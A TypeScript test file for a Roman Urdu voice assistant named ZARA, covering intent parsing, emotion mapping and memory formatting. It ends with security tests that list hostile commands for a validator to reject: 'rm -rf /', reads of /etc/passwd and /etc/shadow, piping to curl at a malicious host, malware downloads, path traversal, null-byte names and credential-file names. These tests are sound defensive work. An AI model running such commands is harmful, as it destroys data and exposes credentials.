import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import fs from 'node:fs';
import { inferEmotionFromText, EMOTIONS } from './emotionRules.ts';
import { detectWakeWord } from './wakeWordDetector.ts';
import { parseWhatsAppCommand } from './whatsappParser.ts';
import {
  sortMemoriesByImportance,
  formatMemoriesForPrompt,
  categorizeNewInfo,
  MemoryRecord,
} from './memoryManager.ts';

test('Emotion inference detects Happy on gratitude/success', () => {
  const result = inferEmotionFromText('Bohat shukriya ZARA zabardast kaam kiya');
  assert.equal(result.emotion, 'Happy');
  assert.equal(result.confidence, 'high');
  assert.ok(result.intensity >= 80);
});

test('Emotion inference detects Caring on distress', () => {
  const result = inferEmotionFromText('Yaar main bohot pareshan hoon tension hai');
  assert.equal(result.emotion, 'Caring');
  assert.equal(result.confidence, 'high');
});

test('Wake word detector recognizes "Hello ZARA"', () => {
  const match = detectWakeWord('Hello ZARA kya haal hain?');
  assert.equal(match.detected, true);
  assert.equal(match.phrase, 'hello zara');
  assert.equal(match.isAssalamGreeting, false);
  assert.equal(match.remainderText, 'kya haal hain?');
});

test('Wake word detector recognizes "Assalam-o-Alaikum ZARA" greeting', () => {
  const match = detectWakeWord('Assalam-o-Alaikum ZARA');
  assert.equal(match.detected, true);
  assert.equal(match.isAssalamGreeting, true);
});

test('Wake word detector rejects non-matching phrase', () => {
  const match = detectWakeWord('Aaj mausam kaisa hai');
  assert.equal(match.detected, false);
});

test('WhatsApp parser extracts contact and message', () => {
  const cmd = parseWhatsAppCommand(
    'Hamza ko message bhejo ke main 5 minute mein aa raha hoon'
  );
  assert.equal(cmd.isWhatsAppIntent, true);
  assert.equal(cmd.contactName, 'Hamza');
  assert.equal(cmd.messageText, 'main 5 minute mein aa raha hoon');
});

test('Memory manager sorts by high importance first', () => {
  const items: MemoryRecord[] = [
    {
      id: '1',
      category: 'fact',
      key: 'city',
      value: 'Lahore',
      importance: 'low',
      userApproved: true,
      isActive: true,
      createdAt: '2026-01-01T00:00:00Z',
    },
    {
      id: '2',
      category: 'preference',
      key: 'tea',
      value: 'Cardamom Karak Chai',
      importance: 'high',
      userApproved: true,
      isActive: true,
      createdAt: '2026-01-02T00:00:00Z',
    },
  ];
  const sorted = sortMemoriesByImportance(items);
  assert.equal(sorted[0].key, 'tea');
  assert.equal(sorted[1].key, 'city');
});

test('Memory prompt formatter formats active approved memories', () => {
  const items: MemoryRecord[] = [
    {
      id: '1',
      category: 'preference',
      key: 'Call Name',
      value: 'Boss',
      importance: 'high',
      userApproved: true,
      isActive: true,
      createdAt: '2026-01-01T00:00:00Z',
    },
  ];
  const prompt = formatMemoriesForPrompt(items);
  assert.ok(prompt.includes('[PREFERENCE] Call Name: Boss'));
});

test('Memory category detector tags tea as preference and task as task', () => {
  assert.equal(categorizeNewInfo('drink', 'I like doodh patti chai'), 'preference');
  assert.equal(categorizeNewInfo('work', 'finish report deadline kal hai'), 'task');
});

test('buildGeminiContents drops leading model turn and alternates strictly', async () => {
  const { buildGeminiContents } = await import('./conversationFormatter.ts');
  const history = [
    { role: 'zara', content: 'Arre Boss! Kya chal raha hai?' }, // Leading model turn
    { role: 'user', content: 'Chai pi li?' },
    { role: 'user', content: 'Aur sunao' }, // Consecutive user turn
  ];
  const payload = buildGeminiContents(history, 'Mausam kaisa hai aaj?');

  assert.ok(payload.length > 0);
  assert.equal(payload[0].role, 'user', 'First turn must strictly be user');
  assert.equal(payload[payload.length - 1].role, 'user', 'Last turn must strictly be user');

  // Verify alternating roles
  for (let i = 1; i < payload.length; i++) {
    assert.notEqual(
      payload[i].role,
      payload[i - 1].role,
      `Turn ${i} and ${i - 1} must alternate roles`
    );
  }
});

test('cleanResponseText removes system prompt leaks and banned phrases', async () => {
  const { cleanResponseText, BANNED_LINES } = await import('./conversationFormatter.ts');
  const leakedText = `
Tum ZARA ho — mere real life best friend.
Roman Urdu mein baat karo. Mujhe "Boss" kaho.
CURRENT EMOTIONAL CONTEXT: Confident
ZARA hazir hai Boss! Hukum karein. Sab badhiya hai!
`;
  const cleaned = cleanResponseText(leakedText);
  assert.ok(!cleaned.includes('Tum ZARA ho'));
  assert.ok(!cleaned.includes('CURRENT EMOTIONAL CONTEXT'));
  for (const banned of BANNED_LINES) {
    assert.ok(!cleaned.toLowerCase().includes(banned.toLowerCase()), `Banned phrase found: ${banned}`);
  }
  assert.ok(cleaned.includes('Sab badhiya hai!'));
});

test('generateContextualDostanaFallback returns non-empty natural Urdu responses without banned phrases', async () => {
  const { generateContextualDostanaFallback, BANNED_LINES } = await import('./conversationFormatter.ts');
  const samples = ['salam', 'chai', 'kaise ho', '', 'kuch naya batao'];
  for (const s of samples) {
    const reply = generateContextualDostanaFallback(s);
    assert.ok(reply.length > 5);
    for (const banned of BANNED_LINES) {
      assert.ok(!reply.toLowerCase().includes(banned.toLowerCase()), `Banned phrase in fallback: ${banned}`);
    }
  }
});

test('Laptop parser detects folder open command', async () => {
  const { parseLaptopAction } = await import('./laptopControlParser.ts');
  const res = parseLaptopAction('ZARA, Downloads folder kholo');
  assert.equal(res.isLaptopAction, true);
  assert.equal(res.action?.type, 'folder_open');
  assert.equal(res.action?.target, 'Downloads');
  assert.equal(res.action?.requiresDoubleConfirm, false);
});

test('Laptop parser detects file search command', async () => {
  const { parseLaptopAction } = await import('./laptopControlParser.ts');
  const res = parseLaptopAction('ZARA, resume.pdf dhundo');
  assert.equal(res.isLaptopAction, true);
  assert.equal(res.action?.type, 'file_search');
  assert.equal(res.action?.target, 'resume.pdf');
});

test('Laptop parser marks file deletion as sensitive requiring double confirmation', async () => {
  const { parseLaptopAction } = await import('./laptopControlParser.ts');
  const res = parseLaptopAction('file delete karo old_notes.txt');
  assert.equal(res.isLaptopAction, true);
  assert.equal(res.action?.type, 'file_delete');
  assert.equal(res.action?.target, 'old_notes.txt');
  assert.equal(res.action?.requiresDoubleConfirm, true);
});

test('Laptop parser detects YouTube search', async () => {
  const { parseLaptopAction } = await import('./laptopControlParser.ts');
  const res = parseLaptopAction('ZARA, YouTube par lofi music search karo');
  assert.equal(res.isLaptopAction, true);
  assert.equal(res.action?.type, 'browser_search');
  assert.equal(res.action?.payload?.engine, 'youtube');
  assert.equal(res.action?.payload?.query, 'lofi music');
});

test('Laptop parser detects app launch (Notepad & Calculator)', async () => {
  const { parseLaptopAction } = await import('./laptopControlParser.ts');
  const np = parseLaptopAction('ZARA, Notepad kholo');
  assert.equal(np.isLaptopAction, true);
  assert.equal(np.action?.type, 'app_launch');
  assert.equal(np.action?.target, 'Notepad');

  const calc = parseLaptopAction('Calculator kholo');
  assert.equal(calc.isLaptopAction, true);
  assert.equal(calc.action?.type, 'app_launch');
  assert.equal(calc.action?.target, 'Calculator');
});

test('Laptop parser marks app close as sensitive requiring double confirmation', async () => {
  const { parseLaptopAction } = await import('./laptopControlParser.ts');
  const res = parseLaptopAction('Notepad band karo');
  assert.equal(res.isLaptopAction, true);
  assert.equal(res.action?.type, 'app_close');
  assert.equal(res.action?.target, 'Notepad');
  assert.equal(res.action?.requiresDoubleConfirm, true);
});

test('Laptop parser detects volume commands and screenshot', async () => {
  const { parseLaptopAction } = await import('./laptopControlParser.ts');
  const vol = parseLaptopAction('ZARA, volume kam karo');
  assert.equal(vol.isLaptopAction, true);
  assert.equal(vol.action?.type, 'volume_change');
  assert.equal(vol.action?.payload?.delta, -15);

  const scr = parseLaptopAction('screenshot lo');
  assert.equal(scr.isLaptopAction, true);
  assert.equal(scr.action?.type, 'screenshot_take');
});

test('Laptop parser detects WhatsApp desktop open and message dispatch with double confirm', async () => {
  const { parseLaptopAction } = await import('./laptopControlParser.ts');
  const waOpen = parseLaptopAction('WhatsApp kholo');
  assert.equal(waOpen.isLaptopAction, true);
  assert.equal(waOpen.action?.type, 'whatsapp_launch');

  const waSend = parseLaptopAction('WhatsApp par Hamza ko message bhejo: Kal milte hain');
  assert.equal(waSend.isLaptopAction, true);
  assert.equal(waSend.action?.type, 'whatsapp_draft_send');
  assert.equal(waSend.action?.payload?.contactName, 'Hamza');
  assert.equal(waSend.action?.payload?.messageText, 'Kal milte hain');
  assert.equal(waSend.action?.requiresDoubleConfirm, true);
});

test('Laptop parser detects voice confirmation and cancellation intents', async () => {
  const { parseLaptopAction } = await import('./laptopControlParser.ts');
  assert.equal(parseLaptopAction('haan kar do').userConfirmationIntent, 'confirm');
  assert.equal(parseLaptopAction('theek hai').userConfirmationIntent, 'confirm');
  assert.equal(parseLaptopAction('nahi ruko').userConfirmationIntent, 'cancel');
  assert.equal(parseLaptopAction('cancel karo').userConfirmationIntent, 'cancel');
});

test('Camera emotion mapper converts user expressions to ZARA reaction states', async () => {
  const { mapUserEmotionToZara } = await import('./cameraEmotionMapper.ts');
  
  // Happy -> Khushi / Happy
  const happy = mapUserEmotionToZara('happy');
  assert.equal(happy.zaraEmotion, 'Happy');
  assert.ok(happy.intensity >= 80);
  assert.ok(happy.urduTitle.includes('Khushi'));

  // Sad -> Hamdardi / Caring
  const sad = mapUserEmotionToZara('sad');
  assert.equal(sad.zaraEmotion, 'Caring');
  assert.ok(sad.empathy >= 90);
  assert.ok(sad.urduTitle.includes('Hamdardi'));

  // Angry -> Pur-Sukun / Calm
  const angry = mapUserEmotionToZara('angry');
  assert.equal(angry.zaraEmotion, 'Calm');
  assert.ok(angry.urduTitle.includes('Pur-Sukun'));

  // Surprised -> Tajasus / Curious
  const surprised = mapUserEmotionToZara('surprised');
  assert.equal(surprised.zaraEmotion, 'Curious');
  assert.ok(surprised.urduTitle.includes('Tajasus'));

  // Neutral -> Pur-Aitemaad / Confident
  const neutral = mapUserEmotionToZara('neutral');
  assert.equal(neutral.zaraEmotion, 'Confident');
  assert.ok(neutral.urduTitle.includes('Pur-Aitemaad'));

  // Tired / Fearful -> Hamdardi / Caring
  const tired = mapUserEmotionToZara('tired');
  assert.equal(tired.zaraEmotion, 'Caring');
});

test('Client-side face feature analyzer classifies luminance matrix', async () => {
  const { analyzeFaceFeatures } = await import('./cameraEmotionMapper.ts');
  const dummyMatrix = Array.from({ length: 12 }, () => Array.from({ length: 16 }, () => 128));
  const res = analyzeFaceFeatures(dummyMatrix);
  assert.ok(res.emotion);
  assert.ok(res.confidence > 0 && res.confidence <= 100);
  assert.ok(res.emoji);
});

test('Audio echo lockout strictly blocks microphone capture and wake words during SPEAKING and cooldown', async () => {
  const {
    canMicrophoneCapture,
    canEvaluateWakeWord,
    shouldDropEchoTranscript,
    TTS_COOLDOWN_MS,
  } = await import('./audioEchoLockout.ts');

  assert.ok(TTS_COOLDOWN_MS >= 800 && TTS_COOLDOWN_MS <= 1000, 'Cooldown must be 800ms-1000ms');

  // During SPEAKING state: mic must be false, wake-word false, drop transcript true
  assert.equal(canMicrophoneCapture('SPEAKING', true, false), false);
  assert.equal(canEvaluateWakeWord('SPEAKING', true, false), false);
  assert.equal(shouldDropEchoTranscript('SPEAKING', true, false), true);

  // During 800ms Cooldown: mic must be false, wake-word false, drop transcript true
  assert.equal(canMicrophoneCapture('STANDBY', false, true), false);
  assert.equal(canEvaluateWakeWord('STANDBY', false, true), false);
  assert.equal(shouldDropEchoTranscript('STANDBY', false, true), true);

  // Genuine LISTENING state when NOT locked out and NOT in cooldown: mic allowed
  assert.equal(canMicrophoneCapture('LISTENING', false, false), true);
  assert.equal(canEvaluateWakeWord('LISTENING', false, false), true);
  assert.equal(shouldDropEchoTranscript('LISTENING', false, false), false);

  // Genuine STANDBY state when NOT locked out and NOT in cooldown: wake word allowed
  assert.equal(canEvaluateWakeWord('STANDBY', false, false), true);
});

test('World-Class AI Engine: Software Engineering mode generates working e-commerce app', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('ZARA, e-commerce site banao');
  assert.equal(res.intent, 'software_engineering');
  assert.ok(res.artifact);
  assert.equal(res.artifact?.type, 'code_sandbox');
  assert.ok(res.artifact?.data.previewHtml.includes('ZARA STORE'));
  assert.ok(res.artifact?.data.files.length >= 2);
  assert.ok(res.speechResponseRomanUrdu.includes('Boss'));
});

test('World-Class AI Engine: Software Engineering mode generates todo app', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('ZARA, todo app banao');
  assert.equal(res.intent, 'software_engineering');
  assert.ok(res.artifact?.data.previewHtml.includes('TaskFlow'));
});

test('World-Class AI Engine: Research & Analysis mode generates structured executive report', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('ZARA, AI trends research karo');
  assert.equal(res.intent, 'research_analysis');
  assert.ok(res.artifact);
  assert.equal(res.artifact?.type, 'research_report');
  assert.ok(res.artifact?.data.metrics.length >= 3);
  assert.ok(res.artifact?.data.keyFindings.length >= 2);
  assert.ok(res.artifact?.data.actionItems.length >= 2);
});

test('World-Class AI Engine: Creative Logo mode generates scalable vector SVG', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('ZARA, logo banao meri company ka Apex Tech');
  assert.equal(res.intent, 'creative_logo');
  assert.ok(res.artifact);
  assert.equal(res.artifact?.type, 'svg_logo');
  assert.ok(res.artifact?.data.svgCode.includes('<svg'));
  assert.ok(res.artifact?.data.colorPalette.length >= 3);
});

test('World-Class AI Engine: Creative Presentation mode creates 5-slide deck', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('ZARA, presentation banao AI Agents par');
  assert.equal(res.intent, 'creative_presentation');
  assert.ok(res.artifact);
  assert.equal(res.artifact?.type, 'slide_deck');
  assert.equal(res.artifact?.data.slides.length, 5);
  assert.ok(res.artifact?.data.slides[0].speakerNotes);
});

test('World-Class AI Engine: Creative Video Script mode writes viral hook and scenes', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('ZARA, video script likho coding tips par');
  assert.equal(res.intent, 'creative_video_script');
  assert.ok(res.artifact);
  assert.equal(res.artifact?.type, 'video_script');
  assert.ok(res.artifact?.data.hook.length > 10);
  assert.ok(res.artifact?.data.scenes.length >= 3);
});

test('World-Class AI Engine: Automation mode registers daily scheduled report', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('ZARA, daily report banao har roz 9 baje');
  assert.equal(res.intent, 'automation_schedule');
  assert.ok(res.artifact);
  assert.equal(res.artifact?.type, 'automation_job');
  assert.equal(res.artifact?.data.status, 'active');
});

test('World-Class AI Engine: Automation mode organizes downloads folder into 5 categories', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('Downloads folder organize karo');
  assert.equal(res.intent, 'automation_organize_files');
  assert.ok(res.artifact);
  assert.equal(res.artifact?.type, 'file_organization');
  assert.equal(res.artifact?.data.categories.length, 5);
});

test('World-Class AI Engine: Code error diagnosis resolves undefined map error', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('ZARA, yeh error fix karo: TypeError: Cannot read properties of undefined (reading map)');
  assert.equal(res.intent, 'code_error_fix');
  assert.ok(res.artifact);
  assert.ok(res.speechResponseRomanUrdu.includes('map'));
  assert.ok(res.artifact?.data.previewHtml.includes('optional chaining') || res.artifact?.data.previewHtml.includes('items?.map'));
});

test('SpeechRecognitionEngine maps language preference correctly', async () => {
  const { speechRecognitionEngine } = await import('../engines/SpeechRecognitionEngine.ts');
  speechRecognitionEngine.setLanguage('english');
  assert.equal(speechRecognitionEngine.getLanguage(), 'en-US');

  speechRecognitionEngine.setLanguage('roman_urdu');
  assert.equal(speechRecognitionEngine.getLanguage(), 'ur-PK');
});

test('Language toggle persists in settings store', async () => {
  const { useSettingsStore } = await import('../store/settingsStore.ts');
  useSettingsStore.setState({
    settings: {
      ...useSettingsStore.getState().settings,
      preferredLanguage: 'english',
    },
  });
  assert.equal(useSettingsStore.getState().settings.preferredLanguage, 'english');

  useSettingsStore.setState({
    settings: {
      ...useSettingsStore.getState().settings,
      preferredLanguage: 'roman_urdu',
    },
  });
  assert.equal(useSettingsStore.getState().settings.preferredLanguage, 'roman_urdu');
});

test('Direct Intent Execution: "inspire ka logo" generates Inspire vector logo immediately', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('inspire ka logo');
  assert.equal(res.intent, 'creative_logo');
  assert.equal(res.needsClarification, undefined);
  assert.ok(res.artifact);
  assert.equal(res.artifact.type, 'svg_logo');
  assert.ok(res.artifact.data.companyName.includes('INSPIRE'));
  assert.ok(res.artifact.data.svgCode.includes('INSPIRE'));
  assert.ok(res.artifact.data.colorPalette.length >= 4);
  assert.ok(!res.speechResponseRomanUrdu.includes('plan'));
  assert.ok(!res.speechResponseRomanUrdu.includes('dilchasp'));
});

test('Clarification Rule: bare "logo banao" asks targeted question without generic filler', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('logo banao');
  assert.equal(res.intent, 'creative_logo');
  assert.equal(res.needsClarification, true);
  assert.equal(res.clarificationType, 'logo_brand');
  assert.equal(res.speechResponseRomanUrdu, 'Boss, kis cheez ka logo?');
});

test('Clarification Rule: bare "website banao" asks targeted question with types', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('website banao');
  assert.equal(res.intent, 'software_engineering');
  assert.equal(res.needsClarification, true);
  assert.equal(res.clarificationType, 'website_type');
  assert.equal(res.speechResponseRomanUrdu, 'Boss, kis type ki? E-commerce/Portfolio/Blog?');
});

test('Direct Intent Execution: "portfolio website banao" generates portfolio code sandbox immediately', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('portfolio website banao');
  assert.equal(res.intent, 'software_engineering');
  assert.equal(res.needsClarification, undefined);
  assert.ok(res.artifact);
  assert.equal(res.artifact.type, 'code_sandbox');
  assert.ok(res.artifact.data.previewHtml.includes('Portfolio'));
});

test('Direct Intent Execution: "[app] kholo" recognizes app launch immediately', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const chromeRes = detectAdvancedIntent('chrome kholo');
  assert.equal(chromeRes.intent, 'app_launch');
  assert.equal(chromeRes.directAction?.appName, 'Google Chrome');
  assert.ok(chromeRes.speechResponseRomanUrdu.includes('Google Chrome foran open kar diya'));

  const npRes = detectAdvancedIntent('notepad kholo');
  assert.equal(npRes.intent, 'app_launch');
  assert.equal(npRes.directAction?.appName, 'Notepad');
});

test('Clarification Rule: bare "app kholo" asks targeted question', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('app kholo');
  assert.equal(res.intent, 'app_launch');
  assert.equal(res.needsClarification, true);
  assert.equal(res.clarificationType, 'app_name');
  assert.equal(res.speechResponseRomanUrdu, 'Boss, konsi app kholoon? Chrome/Notepad/Calculator/VS Code?');
});

test('Direct Intent Execution: "[topic] research karo" generates structured report immediately', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('crypto research karo');
  assert.equal(res.intent, 'research_analysis');
  assert.equal(res.needsClarification, undefined);
  assert.ok(res.artifact);
  assert.equal(res.artifact.type, 'research_report');
  assert.ok(res.artifact.data.topic.includes('Crypto'));
});

test('Clarification Rule: bare "research karo" asks targeted question', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('research karo');
  assert.equal(res.intent, 'research_analysis');
  assert.equal(res.needsClarification, true);
  assert.equal(res.clarificationType, 'research_topic');
  assert.equal(res.speechResponseRomanUrdu, 'Boss, kis topic par research karni hai?');
});

test('Direct Intent Execution: "[name] ko message [text]" drafts WhatsApp message immediately', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('Hamza ko message bhejo kal milte hain');
  assert.equal(res.intent, 'whatsapp_draft');
  assert.equal(res.whatsappDraft?.contactName, 'Hamza');
  assert.equal(res.whatsappDraft?.messageText, 'kal milte hain');
  assert.ok(res.speechResponseRomanUrdu.includes('Hamza ko message draft kar diya hai'));
});

test('Clarification Rule: "[name] ko message" without text asks for message content', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('Hamza ko message');
  assert.equal(res.intent, 'whatsapp_draft');
  assert.equal(res.needsClarification, true);
  assert.equal(res.clarificationType, 'whatsapp_message');
  assert.equal(res.speechResponseRomanUrdu, 'Boss, Hamza ko kya message bhejna hai?');
});

test('Clarification Rule: bare "message bhejo" asks for contact', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const res = detectAdvancedIntent('message bhejo');
  assert.equal(res.intent, 'whatsapp_draft');
  assert.equal(res.needsClarification, true);
  assert.equal(res.clarificationType, 'whatsapp_contact');
  assert.equal(res.speechResponseRomanUrdu, 'Boss, kis ko message bhejna hai?');
});

test('Fallback and sanitizer strictly eliminates generic filler phrases like "dilchasp baat hai"', async () => {
  const { generateContextualDostanaFallback, cleanResponseText } = await import('./conversationFormatter.ts');
  for (let i = 0; i < 20; i++) {
    const res = generateContextualDostanaFallback('inspire ka logo');
    assert.ok(!res.includes('dilchasp'));
    assert.ok(!res.includes('plan banayein'));
    assert.ok(!res.includes('batao plan'));
    assert.ok(!res.includes('kya sochte ho'));
  }

  const cleaned = cleanResponseText('Hmm, dilchasp baat hai! Batao ispar kya plan banayein? Theek hai.');
  assert.ok(!cleaned.includes('dilchasp'));
  assert.ok(!cleaned.includes('plan banayein'));
});

test('Project Status & Progress Intent: e-commerce and dropshipping status query gives structured status', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const userQuery = 'kaam shuru karo aur mujhe kahan tak bani bani e-commerce ki be ke be shop ki matalab jaise dropshipping wagera bi wesy';
  const res = detectAdvancedIntent(userQuery);

  assert.equal(res.intent, 'software_engineering');
  assert.ok(res.artifact);
  assert.equal(res.artifact.type, 'code_sandbox');

  // Verify response contains status (percentage), what is built, what is remaining, and next step
  const speech = res.speechResponseRomanUrdu;
  assert.ok(speech.includes('Core Setup') || speech.includes('70%') || speech.includes('ready'));
  assert.ok(speech.includes('Product catalog') || speech.includes('cart') || speech.includes('checkout'));
  assert.ok(speech.includes('supplier') || speech.includes('payment'));
  assert.ok(speech.includes('Agla step') || speech.includes('step'));

  // Strictly verify NO generic readiness statements
  assert.ok(!speech.includes('Main bilkul ready hoon'));
  assert.ok(!speech.includes('batao agla step kya lena hai'));
  assert.ok(!speech.includes('batayein agla step'));
});

test('Contextual fallback directly answers e-commerce/dropshipping progress query without generic readiness', async () => {
  const { generateContextualDostanaFallback } = await import('./conversationFormatter.ts');
  const userQuery = 'kaam shuru karo aur mujhe kahan tak bani bani e-commerce ki be ke be shop ki matalab jaise dropshipping wagera bi wesy';
  const reply = generateContextualDostanaFallback(userQuery);

  // Must answer actual subject: status, built, remaining, next step
  assert.ok(reply.includes('E-Commerce') || reply.includes('Dropshipping'));
  assert.ok(reply.includes('ready') || reply.includes('70%'));
  assert.ok(reply.includes('Product') || reply.includes('cart') || reply.includes('checkout'));
  assert.ok(reply.includes('supplier') || reply.includes('payment'));
  assert.ok(reply.includes('Agla step'));

  // Absolutely NO generic readiness statement
  assert.ok(!reply.includes('Main bilkul ready hoon'));
  assert.ok(!reply.includes('batayein agla step kya lena hai'));
});

test('Node.js installer URL generates setup guide and download artifact', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');
  const url = 'https://nodejs.org/dist/v20.18.0/node-v20.18.0-x64.msi';
  const res = detectAdvancedIntent(url);

  assert.equal(res.intent, 'software_engineering');
  assert.ok(res.topic.includes('Node.js'));
  assert.ok(res.artifact);
  assert.equal(res.artifact.type, 'code_sandbox');
  assert.ok(res.artifact.data.previewHtml.includes('node-v20.18.0-x64.msi'));
  assert.ok(res.speechResponseRomanUrdu.includes('Node.js v20.18.0'));
});

test('Laptop parser recognizes bare URL as browser open action', async () => {
  const { parseLaptopAction } = await import('./laptopControlParser.ts');
  const url = 'https://nodejs.org/dist/v20.18.0/node-v20.18.0-x64.msi';
  const res = parseLaptopAction(url);

  assert.equal(res.isLaptopAction, true);
  assert.equal(res.action?.type, 'browser_open_url');
  assert.equal(res.action?.target, url);
});

test('Quota exhaustion detection recognizes 429 RESOURCE_EXHAUSTED and extracts retry delay', () => {
  const rawErr = {
    error: {
      code: 429,
      message: 'You exceeded your current quota, please check your plan and billing details... Please retry in 2h1m47s.',
      status: 'RESOURCE_EXHAUSTED',
    },
  };
  const str = JSON.stringify(rawErr);
  const isQuota = str.includes('429') && str.includes('RESOURCE_EXHAUSTED');
  assert.equal(isQuota, true);

  const retryMatch = str.match(/retry in\s+([0-9]+)h([0-9]+)m([0-9]+)s/i);
  assert.ok(retryMatch);
  const hours = parseInt(retryMatch[1], 10);
  const mins = parseInt(retryMatch[2], 10);
  const secs = parseInt(retryMatch[3], 10);
  const totalSec = hours * 3600 + mins * 60 + secs;
  assert.ok(totalSec > 7000);
});

test('Fallback engine guarantees instant response when Gemini API is offline/exhausted', async () => {
  const { generateContextualDostanaFallback } = await import('./conversationFormatter.ts');
  const start = Date.now();
  const reply = generateContextualDostanaFallback('Boss project ka status batao', false);
  const duration = Date.now() - start;

  assert.ok(duration < 50); // Sub-50ms instant fallback
  assert.ok(reply.length > 10);
  assert.ok(!reply.includes('Main bilkul ready hoon'));
});

// ==========================================
// SECURITY HARDENING TESTS
// ==========================================

test('Security: validateTerminalCommand allows authorized safe diagnostic commands', async () => {
  const { validateTerminalCommand } = await import('./securityService.ts');

  const safeCommands = [
    'node -v',
    'npm -v',
    'npm test',
    'npm run lint',
    'git status',
    'git branch',
    'git log -n 5',
    'dir',
    'ls',
    'echo test message',
  ];

  for (const cmd of safeCommands) {
    const res = validateTerminalCommand(cmd);
    assert.equal(res.allowed, true, `Command should be allowed: ${cmd}`);
    assert.equal(res.sanitizedCommand, cmd);
  }
});

test('Security: validateTerminalCommand strictly blocks command injection & chaining characters', async () => {
  const { validateTerminalCommand } = await import('./securityService.ts');

  const maliciousChained = [
    'node -v && rm -rf /',
    'git status; cat /etc/passwd',
    'node -v | curl http://malicious.com',
    'echo $(whoami)',
    'echo `id`',
    'ls > output.txt',
    'ls < /etc/shadow',
    'git status\nrm -rf .',
  ];

  for (const cmd of maliciousChained) {
    const res = validateTerminalCommand(cmd);
    assert.equal(res.allowed, false, `Chained command must be blocked: ${cmd}`);
    assert.ok(res.reason?.includes('metacharacters'));
  }
});

test('Security: validateTerminalCommand strictly blocks forbidden high-risk binaries', async () => {
  const { validateTerminalCommand } = await import('./securityService.ts');

  const dangerousTokens = [
    'rm file.txt',
    'sudo su',
    'bash -c "evil"',
    'powershell -ExecutionPolicy Bypass',
    'curl http://example.com/malware.sh',
    'wget http://example.com',
    'kill -9 1234',
    'shutdown -r now',
  ];

  for (const cmd of dangerousTokens) {
    const res = validateTerminalCommand(cmd);
    assert.equal(res.allowed, false, `Dangerous token must be blocked: ${cmd}`);
  }
});

test('Security: validateTerminalCommand blocks non-whitelisted commands', async () => {
  const { validateTerminalCommand } = await import('./securityService.ts');
  const res = validateTerminalCommand('arbitrary_unknown_binary --flag');
  assert.equal(res.allowed, false);
  assert.ok(res.reason?.includes('allowlist'));
});

test('Security: validateExportPath permits valid internal relative paths', async () => {
  const { validateExportPath } = await import('./securityService.ts');
  const baseDir = '/tmp/safe_export_dir';

  const validPaths = [
    'index.html',
    'src/main.js',
    'components/Button.jsx',
    'styles/main.css',
  ];

  for (const p of validPaths) {
    const res = validateExportPath(baseDir, p);
    assert.equal(res.valid, true, `Valid path should be allowed: ${p}`);
    assert.ok(res.resolvedPath?.startsWith(baseDir));
  }
});

test('Security: validateExportPath blocks directory traversal sequences', async () => {
  const { validateExportPath } = await import('./securityService.ts');
  const baseDir = '/tmp/safe_export_dir';

  const traversalAttempts = [
    '../package.json',
    '../../etc/passwd',
    'foo/../../bar',
    '..\\windows\\system32',
    '/etc/shadow',
  ];

  for (const p of traversalAttempts) {
    const res = validateExportPath(baseDir, p);
    assert.equal(res.valid, false, `Traversal path must be blocked: ${p}`);
    assert.ok(res.reason?.includes('traversal') || res.reason?.includes('outside'));
  }
});

test('Security: validateExportPath blocks null byte injection and credential files while permitting generated project files', async () => {
  const { validateExportPath } = await import('./securityService.ts');
  const baseDir = '/tmp/safe_export_dir';

  // Null byte
  const nullByte = validateExportPath(baseDir, 'safe.txt\0.exe');
  assert.equal(nullByte.valid, false);
  assert.ok(nullByte.reason?.includes('Null byte'));

  // Credential and secret files must be blocked
  const secretFiles = ['.env', '.env.local', 'id_rsa', '.git', '.npmrc', 'private.pem'];
  for (const sf of secretFiles) {
    const res = validateExportPath(baseDir, sf);
    assert.equal(res.valid, false, `Secret file must be blocked: ${sf}`);
    assert.ok(res.reason?.includes('forbidden') || res.reason?.includes('protected'));
  }

  // Generated project files must be allowed inside baseDir
  const pkgRes = validateExportPath(baseDir, 'package.json');
  assert.equal(pkgRes.valid, true, 'Generated project package.json must be allowed');

  const tsRes = validateExportPath(baseDir, 'tsconfig.json');
  assert.equal(tsRes.valid, true, 'Generated project tsconfig.json must be allowed');
});

test('Security: validateSafeUrl validates protocols and rejects command injection', async () => {
  const { validateSafeUrl } = await import('./securityService.ts');

  // Valid URLs
  const valid1 = validateSafeUrl('https://youtube.com/watch?v=test');
  assert.equal(valid1.valid, true);

  const valid2 = validateSafeUrl('google.com');
  assert.equal(valid2.valid, true);
  assert.equal(valid2.sanitizedUrl, 'https://google.com/');

  // Block javascript: or data: schemes
